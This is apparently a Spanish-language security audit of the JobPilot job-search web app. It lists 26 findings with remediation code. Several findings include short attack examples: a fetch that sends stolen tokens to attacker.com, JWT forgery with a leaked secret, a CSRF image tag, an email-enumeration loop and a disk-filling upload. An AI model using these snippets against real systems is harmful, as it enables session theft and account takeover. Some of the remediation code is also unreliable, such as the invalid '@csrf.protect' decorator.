# 🔐 AUDITORÍA DE SEGURIDAD - JOBPILOT
## Revisión Experta en Hacking y Ciberseguridad

**Fecha:** 2026-05-22  
**Aplicación:** JobPilot (Frontend + Backend)  
**Evaluador:** Security Expert (OWASP Top 10 + CVSS)

---

## 📊 RESUMEN EJECUTIVO

| Severidad | Cantidad | Estado |
|-----------|----------|--------|
| 🔴 CRÍTICO | 6 | Sin remediar |
| 🟠 ALTO | 8 | Sin remediar |
| 🟡 MEDIO | 7 | Sin remediar |
| 🟢 BAJO | 5 | Sin remediar |
| **TOTAL** | **26** | **Sin remediar** |

---

## 🔴 VULNERABILIDADES CRÍTICAS (Remediar inmediatamente)

### 1. **Tokens JWT en localStorage sin protección XSS**
**Severidad:** CRÍTICO | **CVSS:** 9.1  
**Ubicación:** `jobpilot-frontend/src/services/api.js` líneas 14, 30, 50

**El Problema:**
```javascript
const token = localStorage.getItem('access_token')  // ❌ VULNERABLE
localStorage.removeItem('refresh_token')             // ❌ VULNERABLE
```

**Impacto:**
- localStorage es vulnerable a **XSS (Cross-Site Scripting)**
- Si hay un XSS, atacante obtiene acceso a tokens y sesión de usuario
- No hay protección contra robo de sesión

**Ataque:**
```javascript
// Malicious script inyectado en DOM
const tokens = localStorage.getItem('access_token')
fetch('https://attacker.com/steal?token=' + tokens)
```

**Remediación:**
- Usar **httpOnly + Secure cookies** en lugar de localStorage
- Si deben usarse tokens en JS, usar **sessionStorage** (menos persistente)
- Implementar **CSRF tokens** para POST/PUT/DELETE

---

### 2. **JWT_SECRET_KEY compartiendo con SECRET_KEY**
**Severidad:** CRÍTICO | **CVSS:** 8.8  
**Ubicación:** `jobpilot-backend/app/__init__.py` línea 32

**El Problema:**
```python
app.config['JWT_SECRET_KEY'] = os.getenv('SECRET_KEY')  # ❌ MISMO SECRET
```

**Impacto:**
- Si SECRET_KEY se compromete (logs, backup, git, fugas), **todo JWT es inválido**
- SECRET_KEY se usa para cookies/sesiones también
- Un atacante puede forjar cualquier token JWT

**Ataque:**
```python
import jwt
# Crear token falso con SECRET_KEY comprometido
payload = {'identity': '1', 'type': 'access'}
fake_token = jwt.encode(payload, compromised_secret)
# Ahora puedo acceder como user_id=1
```

**Remediación:**
```python
app.config['JWT_SECRET_KEY'] = os.getenv('JWT_SECRET_KEY')  # SEPARADO
```

---

### 3. **Sin protección CSRF en POST/PUT/DELETE**
**Severidad:** CRÍTICO | **CVSS:** 8.8  
**Ubicación:** Todos los endpoints que modifican datos

**El Problema:**
```python
@bp.route('/apply', methods=['POST'])
@jwt_required()
def apply_job(job_id):  # ❌ Sin validación CSRF
```

**Impacto:**
- Atacante puede crear sitio malicioso que hace requests a nombre del usuario
- El navegador envía cookies automáticamente
- Usuario puede ser engañado para aplicar a trabajos sin saberlo

**Ataque:**
```html
<!-- En attacker.com -->
<img src="https://jobpilot.com/api/jobs/999/apply" />
<!-- Aplica silenciosamente al trabajo falso -->
```

**Remediación:**
```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect()
csrf.init_app(app)

@bp.route('/apply', methods=['POST'])
@jwt_required()
@csrf.protect
def apply_job(job_id):
    pass
```

---

### 4. **Enum de usuarios mediante error de signup**
**Severidad:** CRÍTICO | **CVSS:** 7.5  
**Ubicación:** `jobpilot-backend/app/routes/auth.py` línea 28

**El Problema:**
```python
if User.query.filter_by(email=email).first():
    return jsonify({'error': 'Email ya existe'}), 409  # ❌ Diferente del no encontrado
```

**Impacto:**
- Atacante puede **enumerar todos los emails registrados**
- Diferente mensaje para "email existe" vs "credenciales inválidas"
- Timing attack: existe == 409 vs no existe == 401

**Ataque:**
```python
emails_validos = []
for email in common_emails:
    resp = requests.post('https://jobpilot.com/api/auth/signup', 
                        json={'email': email, 'password': 'test', 'name': 'test'})
    if resp.status_code == 409:
        emails_validos.append(email)  # ✅ Usuario existe
```

**Remediación:**
```python
if User.query.filter_by(email=email).first():
    return jsonify({'error': 'Credenciales inválidas'}), 400  # Mismo que login fallido
```

---

### 5. **Sin validación de tamaño en upload de archivos (DoS)**
**Severidad:** CRÍTICO | **CVSS:** 7.5  
**Ubicación:** `jobpilot-backend/app/routes/cv.py` línea 66-68

**El Problema:**
```python
file.save(filepath)  # ❌ Sin limite de tamaño
file_size = os.path.getsize(filepath)
```

**Impacto:**
- Atacante puede hacer upload de archivos gigantes (GB+)
- Consume disco del servidor
- **Denial of Service (DoS)** - servidor se queda sin espacio

**Ataque:**
```bash
# Crear archivo gigante (10GB)
dd if=/dev/zero of=big.pdf bs=1M count=10000
# Upload -> servidor colapsa
```

**Remediación:**
```python
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB

if file.content_length > MAX_FILE_SIZE:
    return jsonify({'error': 'File too large (max 10MB)'}), 413

if 'content-length' in request.headers:
    if int(request.headers['content-length']) > MAX_FILE_SIZE:
        return jsonify({'error': 'File too large'}), 413
```

---

### 6. **Sin invalidación de tokens (logout no funciona)**
**Severidad:** CRÍTICO | **CVSS:** 8.2  
**Ubicación:** No hay endpoint de logout funcional

**El Problema:**
```python
# No hay mecanismo de blacklist o token revocation
# Token válido hasta que expire (15 min access, 30 días refresh)
```

**Impacto:**
- Si usuario hace logout en un dispositivo, sigue activo en otro
- Token robado permanece válido toda su duración
- Sin forma de revocar token inmediatamente

**Ataque:**
```
1. Ataque obtiene access_token de usuario
2. Usuario hace "logout" en su dispositivo
3. Ataque sigue usando token válido por 15 minutos más
4. Puede refrescar con refresh_token por 30 días
```

**Remediación:**
```python
# Crear tabla de tokens revocados
class TokenBlacklist(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    jti = db.Column(db.String(36), unique=True)  # JWT ID
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

@app.before_request
def check_if_token_revoked():
    jti = get_jwt()['jti']
    if TokenBlacklist.query.filter_by(jti=jti).first():
        return {'error': 'Token revoked'}, 401

@bp.route('/logout', methods=['POST'])
@jwt_required()
def logout():
    jti = get_jwt()['jti']
    TokenBlacklist.add(jti)
    db.session.commit()
    return {'success': True}
```

---

## 🟠 VULNERABILIDADES ALTO (Remediar en próximo sprint)

### 7. **Sin verificación de email (Anyone can register with fake email)**
**Severidad:** ALTO | **CVSS:** 6.5  
**Ubicación:** `jobpilot-backend/app/routes/auth.py` línea 23

**El Problema:**
```python
signup_data = UserSignup(**data)
email = signup_data.email.lower()  # Solo valida formato, no existencia
```

**Impacto:**
- Usuario puede registrarse con `boss@company.com` (alguien más)
- Sin confirmación, anyone controla el email ajeno
- Acceso no autorizado a cuentas válidas

**Remediación:**
```python
# Enviar OTP/token de verificación por email
# Requerir que confirmen antes de usar cuenta completamente
```

---

### 8. **Refresh token duration demasiado larga (30 días)**
**Severidad:** ALTO | **CVSS:** 6.8  
**Ubicación:** `jobpilot-backend/app/__init__.py` línea 37

**El Problema:**
```python
app.config['JWT_REFRESH_TOKEN_EXPIRES'] = timedelta(days=30)  # ❌ Muy largo
```

**Impacto:**
- Si refresh_token se roba, acceso por 30 días
- 30 días es extremadamente largo para token persistente
- Debería ser máximo 7-14 días

**Remediación:**
```python
app.config['JWT_REFRESH_TOKEN_EXPIRES'] = timedelta(days=7)  # 7 días MAX
```

---

### 9. **Sin rate limiting en endpoints críticos**
**Severidad:** ALTO | **CVSS:** 5.3  
**Ubicación:** `/api/cv/upload`, `/api/chat/send`

**El Problema:**
```python
@bp.route('/upload', methods=['POST'])
@jwt_required()
def upload_cv():  # ❌ Sin limiter.limit()
```

**Impacto:**
- Atacante puede hacer upload ilimitado de archivos (DoS)
- Abuso de servicio de chat (spamming)
- Consumo ilimitado de tokens Claude API

**Remediación:**
```python
@bp.route('/upload', methods=['POST'])
@jwt_required()
@limiter.limit("5 per hour")
def upload_cv():
    pass
```

---

### 10. **Sin protección de Content-Type en JSON responses**
**Severidad:** ALTO | **CVSS:** 5.8  
**Ubicación:** Todos los endpoints

**El Problema:**
```python
return jsonify({'error': 'test'}), 400  # Content-Type: application/json
```

**Impacto:**
- Sin `X-Content-Type-Options: nosniff`, navegador puede interpretar como HTML
- XSS mediante JSON injection

**Remediación:**
```python
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000'
    return response
```

---

### 11. **Búsqueda de jobs vulnerable a inyección (LIKE)**
**Severidad:** ALTO | **CVSS:** 6.5  
**Ubicación:** `jobpilot-backend/app/routes/jobs.py` línea 158-159

**El Problema:**
```python
jobs = Job.query.filter(
    (Job.title.ilike(f'%{query}%')) |  # ❌ Sin validación de query
    (Job.company.ilike(f'%{query}%'))
).limit(limit).all()
```

**Impacto:**
- Aunque SQLAlchemy usa ORM, `%` en LIKE puede causar problemas
- LIKE wildcard injection
- Performance: queries como `%%%%%` causen full table scans

**Remediación:**
```python
# Validar y sanitizar query
if len(query) > 100:
    return jsonify({'error': 'Query too long'}), 400

# Escapar wildcards
query = query.replace('%', '\\%').replace('_', '\\_')

jobs = Job.query.filter(
    (Job.title.ilike(f'%{query}%', escape='\\')) |
    (Job.company.ilike(f'%{query}%', escape='\\'))
).limit(limit).all()
```

---

### 12. **No hay seguridad de rutas en el frontend (SPA)**
**Severidad:** ALTO | **CVSS:** 5.5  
**Ubicación:** `jobpilot-frontend/src/App.jsx`

**El Problema:**
```javascript
<Route path="/dashboard" element={<Dashboard />} />  // ❌ Sin validación
```

**Impacto:**
- Usuario sin token puede acceder a /dashboard si no hay redirect
- Sin verificación de permisos en cliente
- Información sensible podría exponerse

**Remediación:**
```javascript
function ProtectedRoute({ element }) {
  const token = localStorage.getItem('access_token')
  return token ? element : <Navigate to="/login" />
}

<Route path="/dashboard" element={<ProtectedRoute element={<Dashboard />} />} />
```

---

### 13. **Password policy débil permitida por frontend**
**Severidad:** ALTO | **CVSS:** 5.4  
**Ubicación:** `jobpilot-frontend/src/pages/Signup.jsx`

**El Problema:**
- Frontend no muestra requerimientos de password
- Usuario no entiende por qué es rechazado

**Remediación:**
```javascript
// Mostrar requerimientos en tiempo real
const passwordStrength = {
  minLength: password.length >= 8,
  hasUppercase: /[A-Z]/.test(password),
  hasLowercase: /[a-z]/.test(password),
  hasNumber: /[0-9]/.test(password),
  hasSpecial: /[!@#$%^&*]/.test(password),
}
```

---

## 🟡 VULNERABILIDADES MEDIO (Remediar este sprint)

### 14. **Sin HTTPS enforcement (desarrollo OK, producción crítico)**
**Severidad:** MEDIO | **CVSS:** 6.5  
**Ubicación:** Todo el servidor

**El Problema:**
- Desarrollo usa HTTP sin encriptación
- Credenciales se envían en texto plano

**Remediación (Producción):**
```python
@app.before_request
def enforce_https():
    if not request.is_secure and not app.debug:
        return redirect(request.url.replace('http://', 'https://'))
```

---

### 15. **Información sensible en logs**
**Severidad:** MEDIO | **CVSS:** 5.3  
**Ubicación:** Multiple routes (auth.py lineas 91, 96, cv.py lineas 23-38)

**El Problema:**
```python
logger.warning(f"Login attempt with non-existent email: {email}")  # ❌ Log email
logger.info(f"User signup: {email}")  # ❌ Log email
logger.info(f"✅ Usuario encontrado: {user.email}")  # ❌ Información sensible
```

**Impacto:**
- Logs accesibles = datos de usuarios
- Fugas de emails y patrones de uso
- Pueden exponerse en archivos de log, backups, etc.

**Remediación:**
```python
logger.warning(f"Login attempt failed")  # Sin email
logger.info(f"User {user_id} signed up")  # Sin email específico
```

---

### 16. **Sin validación de campo `limit` en paginación**
**Severidad:** MEDIO | **CVSS:** 5.2  
**Ubicación:** `jobpilot-backend/app/routes/jobs.py` línea 68-71

**El Problema:**
```python
jobs = Job.query\
    .order_by(Job.created_at.desc())\
    .limit(100)\  # ❌ Hardcoded, no respeta query_params.limit
    .all()
```

**Impacto:**
- Siempre retorna 100 jobs aunque el usuario pida 10
- Comportamiento inconsistente en paginación

**Remediación:**
```python
jobs = Job.query\
    .order_by(Job.created_at.desc())\
    .limit(min(query_params.limit, 100))  # Máximo 100
    .all()
```

---

### 17. **Sin protección contra Mass Assignment**
**Severidad:** MEDIO | **CVSS:** 5.8  
**Ubicación:** `jobpilot-backend/app/routes/user.py` (no mostrado pero probable)

**El Problema:**
```python
user = User.query.get(user_id)
user.tier = data.get('tier')  # ❌ Permitir upgrade gratis
user.is_admin = data.get('is_admin')  # ❌ Permitir volverse admin
```

**Remediación:**
```python
# Whitelist de campos permitidos
ALLOWED_UPDATE_FIELDS = {'name', 'email_notification'}

for field in ALLOWED_UPDATE_FIELDS:
    if field in data:
        setattr(user, field, data[field])
```

---

### 18. **Archivos de Upload accesibles públicamente**
**Severidad:** MEDIO | **CVSS:** 5.4  
**Ubicación:** `uploads/cvs/` directorio

**El Problema:**
```python
file_path = os.path.join(upload_dir, filename)
file.save(filepath)  # Guardado en /uploads/cvs/ accesible vía web
```

**Impacto:**
- CVs de otros usuarios podrían ser accesibles si adivinan filename
- Información sensible exposada

**Remediación:**
```python
# Guardar en directorio FUERA del web root
UPLOAD_FOLDER = '/var/app/private/cvs'  # No servido por web
# Servir solo via endpoint autenticado
@bp.route('/download/<int:cv_id>')
@jwt_required()
def download_cv(cv_id):
    cv = CV.query.get(cv_id)
    if cv.user_id != int(get_jwt_identity()):
        return {'error': 'Unauthorized'}, 403
    return send_file(cv.file_path)
```

---

### 19. **Sin Connection Pooling límite (Resource exhaustion)**
**Severidad:** MEDIO | **CVSS:** 5.2  
**Ubicación:** `jobpilot-backend/app/__init__.py`

**El Problema:**
```python
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL')
# Sin pool_size, pool_recycle, etc.
```

**Remediación:**
```python
from sqlalchemy.pool import QueuePool

app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
    'poolclass': QueuePool,
    'pool_size': 10,
    'pool_recycle': 3600,
    'pool_pre_ping': True,
    'max_overflow': 20,
}
```

---

### 20. **SQL Injection en Sync endpoints (porta validation)**
**Severidad:** MEDIO | **CVSS:** 6.5  
**Ubicación:** `jobpilot-backend/app/routes/jobs.py` líneas 247, 264

**El Problema:**
```python
def manual_sync_portal(portal):  # ❌ Sin validación de portal
    result = sync_portal_jobs(portal, limit=100)
```

**Impacto:**
- Atacante puede pasar valores inesperados
- Podría ejecutar código no intended

**Remediación:**
```python
VALID_PORTALS = {'linkedin', 'computrabajo', 'indeed'}

def manual_sync_portal(portal):
    if portal not in VALID_PORTALS:
        return jsonify({'error': 'Invalid portal'}), 400
    result = sync_portal_jobs(portal)
```

---

## 🟢 VULNERABILIDADES BAJO (Nice to have)

### 21. **Sin Content Security Policy (CSP)**
**Severidad:** BAJO | **CVSS:** 4.1  
**Remediación:**
```python
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
    return response
```

---

### 22. **Debug mode en .env example**
**Severidad:** BAJO | **CVSS:** 3.2  
**Ubicación:** `.env.example` línea 36

**Remediación:**
```
# .env.example
DEBUG=False  # Cambiar a False siempre en producción
```

---

### 23. **Sin CORS preflight requests validation**
**Severidad:** BAJO | **CVSS:** 3.5  
**Remediación:**
```python
CORS(app, origins=allowed_origins, 
     allow_headers=['Content-Type', 'Authorization'],
     expose_headers=['Content-Type'],
     max_age=3600)
```

---

### 24. **Sin versioning de API**
**Severidad:** BAJO | **CVSS:** 2.8  
**Remediación:**
```python
app.register_blueprint(auth.bp, url_prefix='/api/v1/auth')
# Permite cambios backward-incompatible en v2
```

---

### 25. **Sin logging centralizado (Sentry/Datadog)**
**Severidad:** BAJO | **CVSS:** 2.5  
**Remediación:**
```python
import sentry_sdk
sentry_sdk.init(os.getenv('SENTRY_DSN'))
```

---

### 26. **Contraseñas en URL params (POST debe usarse)**
**Severidad:** BAJO | **CVSS:** 3.1  
**Ubicación:** Buena práctica - ya está correctamente en POST

---

## 📋 CHECKLIST DE REMEDIACIÓN

### CRÍTICOS (Hacer ahora):
- [ ] Mover tokens a httpOnly cookies
- [ ] Separar JWT_SECRET_KEY del SECRET_KEY
- [ ] Implementar CSRF protection
- [ ] Cambiar mensaje de signup para no enumerar usuarios
- [ ] Agregar límite de tamaño en upload
- [ ] Implementar token blacklist/logout

### ALTOS (Próxima semana):
- [ ] Verificación de email con OTP
- [ ] Reducir refresh token a 7 días
- [ ] Rate limiting en cv/upload y chat
- [ ] Headers de seguridad
- [ ] Validar query en búsqueda
- [ ] Protected routes en frontend
- [ ] Password strength validator en UI

### MEDIOS (Este sprint):
- [ ] HTTPS enforcement
- [ ] Remover emails de logs
- [ ] Validar limit en paginación
- [ ] Whitelist de campos en update
- [ ] Mover uploads fuera del web root
- [ ] Connection pooling
- [ ] Validar portal names

---

## 🚀 RECOMENDACIONES DE ARQUITECTURA

### 1. **Implementar Web Application Firewall (WAF)**
```
CloudFlare / AWS WAF para:
- Rate limiting global
- DDoS protection
- Bot detection
```

### 2. **Monitoring y alertas**
```
- Sentry para error tracking
- Datadog para performance
- Security alerts para login failures
```

### 3. **Seguridad en deploy**
```
- Secrets en AWS Secrets Manager / Vault
- No hardcodear keys en .env
- Rotate secrets periódicamente
```

### 4. **Testing de seguridad**
```
- OWASP ZAP para penetration testing
- Dependency scanning (npm audit, pip check)
- SAST (SonarQube)
```

---

## ⏱️ ESTIMACIÓN DE FIXES

| Categoría | Tiempo | Prioridad |
|-----------|--------|----------|
| Críticos | 40 horas | 🔴 HOY |
| Altos | 24 horas | 🟠 Esta semana |
| Medios | 16 horas | 🟡 Este sprint |
| Bajos | 8 horas | 🟢 Cuando sea |

---

## 🔒 CONCLUSIÓN

**La aplicación tiene 26 vulnerabilidades identificadas, 6 de ellas críticas.**

**Estado actual:** ❌ No segura para producción

**Recomendación:** 
1. Remediar todas las críticas ANTES de deploy
2. Altos en próxima semana
3. Medios en este sprint
4. Implementar testing de seguridad en CI/CD

**Riesgo sin remediar:** 
- Robo de datos de usuarios (CVs, información personal)
- Acceso no autorizado
- Pérdida de confidencialidad
- Denial of Service

---

**Próximos pasos:**
```bash
1. Crear issues en GitHub para cada vulnerabilidad
2. Asignar severidades a sprints
3. Implementar security testing en CI/CD
4. Hacer security review de cada PR
```
